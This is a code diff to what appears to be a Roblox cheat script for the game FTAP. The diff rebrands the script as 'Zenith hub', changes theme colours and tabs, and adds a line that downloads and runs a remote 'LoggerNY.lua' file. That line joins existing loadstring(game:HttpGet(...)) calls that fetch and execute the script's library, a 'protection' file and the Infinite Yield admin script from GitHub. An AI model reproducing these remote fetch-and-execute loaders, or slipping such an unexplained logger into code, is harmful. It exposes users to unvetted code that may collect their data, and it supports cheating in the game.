@@ -4,9 +4,10 @@
 	do
 		do
 			do
-				local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Onilte/kkkkkkkkksdsvcs/refs/heads/main/LibraryNY.lua"))()
+                local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Onilte/kkkkkkkkksdsvcs/refs/heads/main/LibraryNY.lua"))()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/Onilte/kkkkkkkkksdsvcs/refs/heads/main/ProtectionNY.lua"))()
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Onilte/kkkkkkkkksdsvcs/refs/heads/main/LoggerNY.lua"))()
 				_G.Library = lib
 
 				do
@@ -73,21 +74,21 @@
 				_G.Sounds = _G.Sounds or {}
 
 				_G.Window = _G.Library:CreateWindow({
-    Title = "No_Breath | FTAP",
+    Title = "Zenith hub | FTAP",
     Theme = {
-        Font = "Nunito",
-        ImageTransparency = 25,
-        BGTransparency = 10,
-        OrbsTransparency = 100,
-        BackgroundID = "",
-        Main = Color3.fromRGB(0, 0, 0),
-        Second = Color3.fromRGB(0, 0, 0),
-        ElementAccent = Color3.fromRGB(0, 70, 140),
-        TextColor = Color3.fromRGB(220, 230, 255),
-        GradientStart = Color3.fromRGB(0, 70, 140),
-        GradientEnd = Color3.fromRGB(0, 30, 80),
-        CornerRadius = 25,
-        HudTransparency = 10,
+       Font = "Nunito",
+ImageTransparency = 25,
+BGTransparency = 10,
+OrbsTransparency = 100,
+BackgroundID = "",
+Main = Color3.fromRGB(0, 0, 0),
+Second = Color3.fromRGB(0, 0, 0),
+ElementAccent = Color3.fromRGB(90, 90, 90),
+TextColor = Color3.fromRGB(235, 235, 235),
+GradientStart = Color3.fromRGB(50, 50, 50),
+GradientEnd = Color3.fromRGB(10, 10, 10),
+CornerRadius = 12,
+HudTransparency = 10,
     },
     ToggleKey = Enum.KeyCode.RightShift,
     Transparency = 0.5,
@@ -98,11 +99,13 @@
 
 				do
 					local window = _G.Window
-					local Visuals = window:CreateTab("Visuals", true, "7035631382")
+					local Main = window:CreateTab("Main", true, "rbxassetid://6034281934")
+					local Grabs = window:CreateTab("Grabs", true, "131943555201082")
 					local v16 = window:CreateTab("Local Player", true, "16149111731")
 					local Protection = window:CreateTab("Protection", true, "112583783444446")
 					local Target = window:CreateTab("Target", true, "83745541516978")
-					local Grabs = window:CreateTab("Grabs", true, "131943555201082")
+					local Blodman = window:CreateTab("Blodman", ture, "venetian-mask")
+					local Visuals = window:CreateTab("Visuals", true, "7035631382")
 					local Server = window:CreateTab("Server", true, "116592854241448")
 					local Misc = window:CreateTab("Misc", true, "104769040369946")
 					_G.VisualTab = Visuals
@@ -118,7 +121,7 @@
 					local library = _G.Library
 					local str5 = "101017996369612"
 					local sound2 = Instance.new("Sound")
-					sound2.SoundId = "rbxassetid://8578195318"
+					sound2.SoundId = "rbxassetid://136256756383193"
 					sound2.Volume = 0.5
 					sound2.Parent = game:GetService("Workspace")
 
